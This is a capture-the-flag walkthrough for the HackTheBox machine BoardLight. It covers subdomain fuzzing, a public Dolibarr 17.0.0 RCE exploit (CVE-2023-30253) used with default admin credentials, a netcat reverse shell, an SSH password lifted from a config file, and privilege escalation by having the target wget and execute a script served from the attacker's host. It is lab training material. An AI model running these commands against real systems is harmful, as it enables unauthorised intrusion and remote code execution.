# HTB Machine Walkthrough: BoardLight
---
> [!IMPORTANT]  
> **Please use this as a hint or guide if you're blocked at some point of this machine, i make those files for myself and to help some friends that are also doing those machines.**


> [!NOTE]  
> **Try to get as far as you can by yourself or you will never learn to make machines alone. Hope you the best and happy hacking <3.**
--- 
## 1. Execute a Fast Nmap Scan on the Provided IP

## 1. Recognition

  

First, verify if the machine is reachable by pinging it:

```bash

ping  $Lab_IP -c 1

```

Next, start enumerating the machine using Nmap:

```bash

nmap  -sV -sC -n -Pn --min-rate 3000 $Lab_IP -vvv

```

Upon navigating to the IP address in a browser, a webpage welcomes us to **BOARDLIGHT** maintained by Board.htb. To discover subdomains, use FFUF:

```bash

ffuf -H  "FUZZ.board.htb" -u "http://board.htb/" -w /usr/share/wordlists/dirb/big.txt

```

A subdomain `crm` is identified. Navigating to `http://crm.board.htb/` reveals a Dolibarr login page.

## 2. Exploit Phase

  

Dolibarr, an ERP and CRM software, is running version 17.0.0. Searching for exploits, we find a [CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253) exploit wich is a RCE that can be exploited via python program.

First, start a netcat listener in the port you desire

```bash

nc -lvnp $PORT

```

Execute the exploit to get a reverse shell:

```bash

python3 exploit.py http://crm.board.htb admin admin $Your_Machine_IP $PORT

```

We gain shell access as `www-data`.

## 3. Privilege Escalation

Explore the directories, and locate the `conf.php` file under `~/html/crm.board.htb/htdocs/conf` containing an SSH password. Use this to SSH into the user `larissa`:

```bash

ssh larissa@$Lab_IP

```

As `larissa`, navigate to `cd /home/larissa/` to find the `user.txt` flag.

To escalate privileges, download a local privilege escalation exploit:


```bash

python3 -m http.server 8080

```

On the target machine:


```bash

wget  http://YourMachine_IP:8080/exploit.sh

chmod  777  exploit.sh

./exploit.sh

```

Once in, as a root, execute a bash terminal by using the following command:

```bash
bash
```

Finally just navigate to `/root` and retrieve the flag, saved as `root.txt`

```bash
cd /root
cat root.txt
```
---
**Congratulations: Machine completed**
---
